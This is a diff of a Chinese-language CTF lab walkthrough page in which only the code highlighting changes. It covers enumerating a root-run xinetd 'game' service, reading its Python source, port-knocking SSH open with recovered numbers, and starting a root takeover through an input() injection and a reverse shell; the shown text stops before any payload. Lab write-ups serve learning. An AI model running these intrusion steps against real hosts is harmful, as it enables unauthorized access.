- \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>telnet<span class="w"> </span><span class="m">10</span>.0.2.10<span class="w"> </span><span class="m">1337</span>
+Trying<span class="w"> </span><span class="m">10</span>.0.2.10...
+Connected<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.0.2.10.
+Escape<span class="w"> </span>character<span class="w"> </span>is<span class="w"> </span><span class="s1">&#39;^]&#39;</span>.
+<span class="w">  </span>____<span class="w">                        </span>_____<span class="w"> </span>_<span class="w">                </span>
+<span class="w"> </span>/<span class="w"> </span>___<span class="p">|</span><span class="w"> </span>__<span class="w"> </span>_<span class="w"> </span>_<span class="w"> </span>__<span class="w"> </span>___<span class="w">   </span>___<span class="w">  </span><span class="p">|</span>_<span class="w">   </span>_<span class="o">(</span>_<span class="o">)</span>_<span class="w"> </span>__<span class="w"> </span>___<span class="w">   </span>___<span class="w"> </span>
+<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>_<span class="w"> </span>/<span class="w"> </span>_<span class="sb">`</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s1">&#39;_ ` _ \ / _ \   | | | | &#39;</span>_<span class="w"> </span><span class="sb">`</span><span class="w"> </span>_<span class="w"> </span><span class="se">\ </span>/<span class="w"> </span>_<span class="w"> </span><span class="se">\</span>
+<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>__/<span class="w">   </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>__/
+<span class="w"> </span><span class="se">\_</span>___<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span><span class="w">   </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>
 
 
-Let's see how good you are with simple maths
-Answer my questions 1000 times and I'll give you your gift.
-(4, '-', 6)
-&gt; 
-
-</code></pre>
+Let<span class="s1">&#39;s see how good you are with simple maths</span>
+<span class="s1">Answer my questions 1000 times and I&#39;</span>ll<span class="w"> </span>give<span class="w"> </span>you<span class="w"> </span>your<span class="w"> </span>gift.
+<span class="o">(</span><span class="m">4</span>,<span class="w"> </span><span class="s1">&#39;-&#39;</span>,<span class="w"> </span><span class="m">6</span><span class="o">)</span>
+&gt;<span class="w"> </span>
+</code></pre></div>
 <p>我们利用 root 权限查询管理其服务：</p>
-<pre><code class="language-bash"># netstat -anp | grep 1337
-netstat -anp | grep 1337
-tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      750/xinetd 
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="c1"># netstat -anp | grep 1337</span>
+netstat<span class="w"> </span>-anp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">1337</span>
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:1337<span class="w">            </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">750</span>/xinetd<span class="w"> </span>
+</code></pre></div>
 <p>发现其使用 xinetd 这一服务，继续查询之：</p>
-<pre><code class="language-bash"># cd /etc/xinetd.d
-cd /etc/xinetd.d
-# ls
+<div class="highlight"><pre><span></span><code><span class="c1"># cd /etc/xinetd.d</span>
+<span class="nb">cd</span><span class="w"> </span>/etc/xinetd.d
+<span class="c1"># ls</span>
 ls
-chargen      daytime      discard      echo      game     services  time-udp
-chargen-udp  daytime-udp  discard-udp  echo-udp  servers  time
-# cat game
-cat game
-service game
+chargen<span class="w">      </span>daytime<span class="w">      </span>discard<span class="w">      </span><span class="nb">echo</span><span class="w">      </span>game<span class="w">     </span>services<span class="w">  </span>time-udp
+chargen-udp<span class="w">  </span>daytime-udp<span class="w">  </span>discard-udp<span class="w">  </span>echo-udp<span class="w">  </span>servers<span class="w">  </span><span class="nb">time</span>
+<span class="c1"># cat game</span>
+cat<span class="w"> </span>game
+service<span class="w"> </span>game
 
-{
+<span class="o">{</span>
 
-  disable = no
+<span class="w">  </span><span class="nv">disable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>no
 
-  socket_type = stream
+<span class="w">  </span><span class="nv">socket_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>stream
 
-  protocol = tcp
+<span class="w">  </span><span class="nv">protocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tcp
 
-  wait = no
+<span class="w">  </span><span class="nb">wait</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>no
 
-  user = root
+<span class="w">  </span><span class="nv">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>root
 
-  type = UNLISTED
+<span class="w">  </span><span class="nb">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>UNLISTED
 
-  bind = 0.0.0.0
+<span class="w">  </span><span class="nb">bind</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>.0.0.0
 
-  port = 1337
+<span class="w">  </span><span class="nv">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1337</span>
 
-  server = /opt/1337/run_challenge.sh
+<span class="w">  </span><span class="nv">server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>/opt/1337/run_challenge.sh
 
-}
-</code></pre>
+<span class="o">}</span>
+</code></pre></div>
 <p>从列表中得到 <code>server</code> 的目录，查看之：</p>
-<pre><code class="language-bash">cat /opt/1337/run_challenge.sh
-#! /bin/bash
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/opt/1337/run_challenge.sh
+<span class="c1">#! /bin/bash</span>
 
-python -u /opt/1337/app.py
+python<span class="w"> </span>-u<span class="w"> </span>/opt/1337/app.py
 
 
-# 
-</code></pre>
+<span class="c1"># </span>
+</code></pre></div>
 <p>得到一个 <code>python</code> 文件的目录，查看之：</p>
-<pre><code class="language-python"># cat python -u /opt/1337/app.py
-cat python -u /opt/1337/app.py
-cat: python: No such file or directory
-#!/usr/bin/env python3
+<div class="highlight"><pre><span></span><code><span class="c1"># cat python -u /opt/1337/app.py</span>
+<span class="n">cat</span> <span class="n">python</span> <span class="o">-</span><span class="n">u</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="mi">1337</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">py</span>
+<span class="n">cat</span><span class="p">:</span> <span class="n">python</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span>
+<span class="c1">#!/usr/bin/env python3</span>
 
-import sys
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
 
-from random import choice, randint
+<span class="kn">from</span><span class="w"> </span><span class="nn">random</span><span class="w"> </span><span class="kn">import</span> <span class="n">choice</span><span class="p">,</span> <span class="n">randint</span>
 
 
 
-from pyfiglet import print_figlet
+<span class="kn">from</span><span class="w"> </span><span class="nn">pyfiglet</span><span class="w"> </span><span class="kn">import</span> <span class="n">print_figlet</span>
 
 
 
 
 
-def add(a,b): return a+b
+<span class="k">def</span><span class="w"> </span><span class="nf">add</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span> <span class="k">return</span> <span class="n">a</span><span class="o">+</span><span class="n">b</span>
 
-def div(a,b): return int(a/b)
+<span class="k">def</span><span class="w"> </span><span class="nf">div</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span> <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="o">/</span><span class="n">b</span><span class="p">)</span>
 
-def multiply(a,b): return a*b
+<span class="k">def</span><span class="w"> </span><span class="nf">multiply</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span> <span class="k">return</span> <span class="n">a</span><span class="o">*</span><span class="n">b</span>
 
-def sub(a,b): return a-b
+<span class="k">def</span><span class="w"> </span><span class="nf">sub</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span> <span class="k">return</span> <span class="n">a</span><span class="o">-</span><span class="n">b</span>
 
 
 
-print_figlet(&quot;Game Time&quot;)
+<span class="n">print_figlet</span><span class="p">(</span><span class="s2">&quot;Game Time&quot;</span><span class="p">)</span>
 
-print(&quot;Let's see how good you are with simple maths&quot;)
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Let&#39;s see how good you are with simple maths&quot;</span><span class="p">)</span>
 
-print(&quot;Answer my questions 1000 times and I'll give you your gift.&quot;)
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Answer my questions 1000 times and I&#39;ll give you your gift.&quot;</span><span class="p">)</span>
 
 
 
 
 
-OPERATIONS = ['+', '-', &quot;/&quot;, &quot;*&quot;]
+<span class="n">OPERATIONS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="s2">&quot;*&quot;</span><span class="p">]</span>
 
 
 
-def main():
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
 
-    for i in range(1001):
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1001</span><span class="p">):</span>
 
-        a = randint(1,9)
+        <span class="n">a</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span>
 
-        b = randint(1,9)
+        <span class="n">b</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span>
 
-        op = choice(OPERATIONS)
+        <span class="n">op</span> <span class="o">=</span> <span class="n">choice</span><span class="p">(</span><span class="n">OPERATIONS</span><span class="p">)</span>
 
 
 
-        print(a,op,b)
+        <span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">op</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
 
-        if op == &quot;+&quot;:
+        <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s2">&quot;+&quot;</span><span class="p">:</span>
 
-            val = add(a,b)
+            <span class="n">val</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
 
-        if op == &quot;-&quot;:
+        <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s2">&quot;-&quot;</span><span class="p">:</span>
 
-            val = sub(a,b)
+            <span class="n">val</span> <span class="o">=</span> <span class="n">sub</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
 
-        if op == &quot;/&quot;:
+        <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s2">&quot;/&quot;</span><span class="p">:</span>
 
-            val = div(a,b)
+            <span class="n">val</span> <span class="o">=</span> <span class="n">div</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
 
-        if op == &quot;*&quot;:
+        <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s2">&quot;*&quot;</span><span class="p">:</span>
 
-            val = multiply(a,b)
+            <span class="n">val</span> <span class="o">=</span> <span class="n">multiply</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
 
 
 
-        try:
+        <span class="k">try</span><span class="p">:</span>
 
-            In = int(input(&quot;&gt; &quot;))
+            <span class="n">In</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;&gt; &quot;</span><span class="p">))</span>
 
-        except Exception:
+        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
 
-            print(&quot;Stop acting like a hacker for a damn minute!!&quot;)
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Stop acting like a hacker for a damn minute!!&quot;</span><span class="p">)</span>
 
-            sys.exit(1)
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
 
 
-        if In == val:
+        <span class="k">if</span> <span class="n">In</span> <span class="o">==</span> <span class="n">val</span><span class="p">:</span>
 
-            continue
+            <span class="k">continue</span>
 
-        else:
+        <span class="k">else</span><span class="p">:</span>
 
-            print(&quot;Wrong answer&quot;)
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Wrong answer&quot;</span><span class="p">)</span>
 
-            sys.exit(1)
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
 
 
-    with open(&quot;/opt/1337/p0rt5&quot;, 'r') as f:
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/opt/1337/p0rt5&quot;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
 
-        print(f.read())
+        <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
 
 
 
-if __name__ == &quot;__main__&quot;:
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
 
-    main()
+    <span class="n">main</span><span class="p">()</span>
 
 
-# 
-</code></pre>
+<span class="c1"># </span>
+</code></pre></div>
 <p>这里仍然存在 <code>input()</code> 的注入漏洞，不过既然我们知道源代码了，可以直接查看代码中作为结果打开的文件：</p>
-<pre><code class="language-bash"># cat /opt/1337/p0rt5
-cat /opt/1337/p0rt5
-Here is your gift, I hope you know what to do with it:
+<div class="highlight"><pre><span></span><code><span class="c1"># cat /opt/1337/p0rt5</span>
+cat<span class="w"> </span>/opt/1337/p0rt5
+Here<span class="w"> </span>is<span class="w"> </span>your<span class="w"> </span>gift,<span class="w"> </span>I<span class="w"> </span>hope<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>what<span class="w"> </span>to<span class="w"> </span><span class="k">do</span><span class="w"> </span>with<span class="w"> </span>it:
 
-1356, 6784, 3409
-</code></pre>
+<span class="m">1356</span>,<span class="w"> </span><span class="m">6784</span>,<span class="w"> </span><span class="m">3409</span>
+</code></pre></div>
 <p>得到了三个数字。</p>
 <p>这三个数字有很多方法得到：</p>
 <ol>
@@ -4004,95 +4003,95 @@ Here is your gift, I hope you know what to do with it:
 </ol>
 <h3 id="_2">二、三个数字的用处</h3>
 <p>这三个数字其实是用于打开 filtered 的 22 号端口：</p>
-<pre><code class="language-bash">└─$ sudo nmap -p- 10.0.2.10
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 02:32 EST
-Nmap scan report for 10.0.2.10
-Host is up (0.00015s latency).
-Not shown: 65531 closed tcp ports (reset)
-PORT     STATE    SERVICE
-21/tcp   open     ftp
-22/tcp   filtered ssh
-1337/tcp open     waste
-7331/tcp open     swx
-MAC Address: 08:00:27:12:0C:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.0.2.10
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-11-30<span class="w"> </span><span class="m">02</span>:32<span class="w"> </span>EST
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.0.2.10
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00015s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65531</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+PORT<span class="w">     </span>STATE<span class="w">    </span>SERVICE
+<span class="m">21</span>/tcp<span class="w">   </span>open<span class="w">     </span>ftp
+<span class="m">22</span>/tcp<span class="w">   </span>filtered<span class="w"> </span>ssh
+<span class="m">1337</span>/tcp<span class="w"> </span>open<span class="w">     </span>waste
+<span class="m">7331</span>/tcp<span class="w"> </span>open<span class="w">     </span>swx
+MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">08</span>:00:27:12:0C:64<span class="w"> </span><span class="o">(</span>PCS<span class="w"> </span>Systemtechnik/Oracle<span class="w"> </span>VirtualBox<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>
 
-Nmap done: 1 IP address (1 host up) scanned in 2.25 second
-</code></pre>
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">2</span>.25<span class="w"> </span>second
+</code></pre></div>
 <p>使用如下命令，对端口进行敲门：</p>
-<pre><code class="language-bash">┌──(kali㉿kali)-[~]
-└─$ knock 10.0.2.10 1356 6784 3409
+<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>knock<span class="w"> </span><span class="m">10</span>.0.2.10<span class="w"> </span><span class="m">1356</span><span class="w"> </span><span class="m">6784</span><span class="w"> </span><span class="m">3409</span>
 
-┌──(kali㉿kali)-[~]
-└─$ sudo nmap -p- 10.0.2.10                                                                                                                  
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 02:34 EST
-Nmap scan report for 10.0.2.10
-Host is up (0.00044s latency).
-Not shown: 65531 closed tcp ports (reset)
-PORT     STATE SERVICE
-21/tcp   open  ftp
-22/tcp   open  ssh
-1337/tcp open  waste
-7331/tcp open  swx
-MAC Address: 08:00:27:12:0C:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.0.2.10<span class="w">                                                                                                                  </span>
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-11-30<span class="w"> </span><span class="m">02</span>:34<span class="w"> </span>EST
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.0.2.10
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00044s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65531</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
+<span class="m">21</span>/tcp<span class="w">   </span>open<span class="w">  </span>ftp
+<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh
+<span class="m">1337</span>/tcp<span class="w"> </span>open<span class="w">  </span>waste
+<span class="m">7331</span>/tcp<span class="w"> </span>open<span class="w">  </span>swx
+MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">08</span>:00:27:12:0C:64<span class="w"> </span><span class="o">(</span>PCS<span class="w"> </span>Systemtechnik/Oracle<span class="w"> </span>VirtualBox<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>
 
-Nmap done: 1 IP address (1 host up) scanned in 2.60 seconds
-</code></pre>
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">2</span>.60<span class="w"> </span>seconds
+</code></pre></div>
 <p>也就是打开了 22 号端口，从而我们可以使用 ssh 服务了。</p>
 <p>这点最直接的用处是可以直接远程登陆 nitish 用户，而不必再使用反弹 shell：</p>
-<pre><code class="language-bash">└─$ ssh nitish@10.0.2.10
-The authenticity of host '10.0.2.10 (10.0.2.10)' can't be established.
-ED25519 key fingerprint is SHA256:hDngTQnjVXoBeWuPEH3si0MbCre9a/g2G4N6/pRZLFk.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.0.2.10' (ED25519) to the list of known hosts.
-nitish@10.0.2.10's password: 
-Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-66-generic x86_64)
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>ssh<span class="w"> </span>nitish@10.0.2.10
+The<span class="w"> </span>authenticity<span class="w"> </span>of<span class="w"> </span>host<span class="w"> </span><span class="s1">&#39;10.0.2.10 (10.0.2.10)&#39;</span><span class="w"> </span>can<span class="s1">&#39;t be established.</span>
+<span class="s1">ED25519 key fingerprint is SHA256:hDngTQnjVXoBeWuPEH3si0MbCre9a/g2G4N6/pRZLFk.</span>
+<span class="s1">This key is not known by any other names.</span>
+<span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="s1">Warning: Permanently added &#39;</span><span class="m">10</span>.0.2.10<span class="s1">&#39; (ED25519) to the list of known hosts.</span>
+<span class="s1">nitish@10.0.2.10&#39;</span>s<span class="w"> </span>password:<span class="w"> </span>
+Welcome<span class="w"> </span>to<span class="w"> </span>Ubuntu<span class="w"> </span><span class="m">18</span>.04.3<span class="w"> </span>LTS<span class="w"> </span><span class="o">(</span>GNU/Linux<span class="w"> </span><span class="m">4</span>.15.0-66-generic<span class="w"> </span>x86_64<span class="o">)</span>
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
+<span class="w"> </span>*<span class="w"> </span>Documentation:<span class="w">  </span>https://help.ubuntu.com
+<span class="w"> </span>*<span class="w"> </span>Management:<span class="w">     </span>https://landscape.canonical.com
+<span class="w"> </span>*<span class="w"> </span>Support:<span class="w">        </span>https://ubuntu.com/advantage
 
-  System information as of Sun Nov 30 13:05:28 IST 2025
+<span class="w">  </span>System<span class="w"> </span>information<span class="w"> </span>as<span class="w"> </span>of<span class="w"> </span>Sun<span class="w"> </span>Nov<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">13</span>:05:28<span class="w"> </span>IST<span class="w"> </span><span class="m">2025</span>
 
-  System load:  0.0               Processes:           118
-  Usage of /:   37.6% of 9.78GB   Users logged in:     1
-  Memory usage: 21%               IP address for eth0: 10.0.2.10
-  Swap usage:   0%
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-
-329 packages can be updated.
-266 updates are security updates.
-
-New release '20.04.6 LTS' available.
-Run 'do-release-upgrade' to upgrade to it.
+<span class="w">  </span>System<span class="w"> </span>load:<span class="w">  </span><span class="m">0</span>.0<span class="w">               </span>Processes:<span class="w">           </span><span class="m">118</span>
+<span class="w">  </span>Usage<span class="w"> </span>of<span class="w"> </span>/:<span class="w">   </span><span class="m">37</span>.6%<span class="w"> </span>of<span class="w"> </span><span class="m">9</span>.78GB<span class="w">   </span>Users<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span>:<span class="w">     </span><span class="m">1</span>
+<span class="w">  </span>Memory<span class="w"> </span>usage:<span class="w"> </span><span class="m">21</span>%<span class="w">               </span>IP<span class="w"> </span>address<span class="w"> </span><span class="k">for</span><span class="w"> </span>eth0:<span class="w"> </span><span class="m">10</span>.0.2.10
+<span class="w">  </span>Swap<span class="w"> </span>usage:<span class="w">   </span><span class="m">0</span>%
 
 
-Last login: Thu Nov 14 20:32:20 2019 from 192.168.1.107
-nitish@box7:~$ 
-</code></pre>
+<span class="w"> </span>*<span class="w"> </span>Canonical<span class="w"> </span>Livepatch<span class="w"> </span>is<span class="w"> </span>available<span class="w"> </span><span class="k">for</span><span class="w"> </span>installation.
+<span class="w">   </span>-<span class="w"> </span>Reduce<span class="w"> </span>system<span class="w"> </span>reboots<span class="w"> </span>and<span class="w"> </span>improve<span class="w"> </span>kernel<span class="w"> </span>security.<span class="w"> </span>Activate<span class="w"> </span>at:
+<span class="w">     </span>https://ubuntu.com/livepatch
+
+<span class="m">329</span><span class="w"> </span>packages<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>updated.
+<span class="m">266</span><span class="w"> </span>updates<span class="w"> </span>are<span class="w"> </span>security<span class="w"> </span>updates.
+
+New<span class="w"> </span>release<span class="w"> </span><span class="s1">&#39;20.04.6 LTS&#39;</span><span class="w"> </span>available.
+Run<span class="w"> </span><span class="s1">&#39;do-release-upgrade&#39;</span><span class="w"> </span>to<span class="w"> </span>upgrade<span class="w"> </span>to<span class="w"> </span>it.
+
+
+Last<span class="w"> </span>login:<span class="w"> </span>Thu<span class="w"> </span>Nov<span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">20</span>:32:20<span class="w"> </span><span class="m">2019</span><span class="w"> </span>from<span class="w"> </span><span class="m">192</span>.168.1.107
+nitish@box7:~$<span class="w"> </span>
+</code></pre></div>
 <h3 id="_3">三、对第一个问题的另一个回答</h3>
 <p>我们之前提到第一个问题的漏洞在于注入漏洞，可以直接输入一千遍 <code>val</code> 得到神秘的三个数字，但是这个注入漏洞还可以起到别的作用。</p>
 <p>注意 game 服务的执行者是 root，我们于是就可以直接通过注入漏洞 + 反弹 shell 窃取其权限：</p>
-<pre><code class="language-bash">└─$ telnet 10.0.2.10 1337                                                                                                                                  
-Trying 10.0.2.10...
-Connected to 10.0.2.10.
-Escape character is '^]'.
-  ____                        _____ _                
- / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
-| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
-| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
- \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>telnet<span class="w"> </span><span class="m">10</span>.0.2.10<span class="w"> </span><span class="m">1337</span><span class="w">                                                                                                                                  </span>
+Trying<span class="w"> </span><span class="m">10</span>.0.2.10...
+Connected<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.0.2.10.
+Escape<span class="w"> </span>character<span class="w"> </span>is<span class="w"> </span><span class="s1">&#39;^]&#39;</span>.
+<span class="w">  </span>____<span class="w">                        </span>_____<span class="w"> </span>_<span class="w">                </span>
+<span class="w"> </span>/<span class="w"> </span>___<span class="p">|</span><span class="w"> </span>__<span class="w"> </span>_<span class="w"> </span>_<span class="w"> </span>__<span class="w"> </span>___<span class="w">   </span>___<span class="w">  </span><span class="p">|</span>_<span class="w">   </span>_<span class="o">(</span>_<span class="o">)</span>_<span class="w"> </span>__<span class="w"> </span>___<span class="w">   </span>___<span class="w"> </span>
+<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>_<span class="w"> </span>/<span class="w"> </span>_<span class="sb">`</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s1">&#39;_ ` _ \ / _ \   | | | | &#39;</span>_<span class="w"> </span><span class="sb">`</span><span class="w"> </span>_<span class="w"> </span><span class="se">\ </span>/<span class="w"> </span>_<span class="w"> </span><span class="se">\</span>
+<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>__/<span class="w">   </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>__/
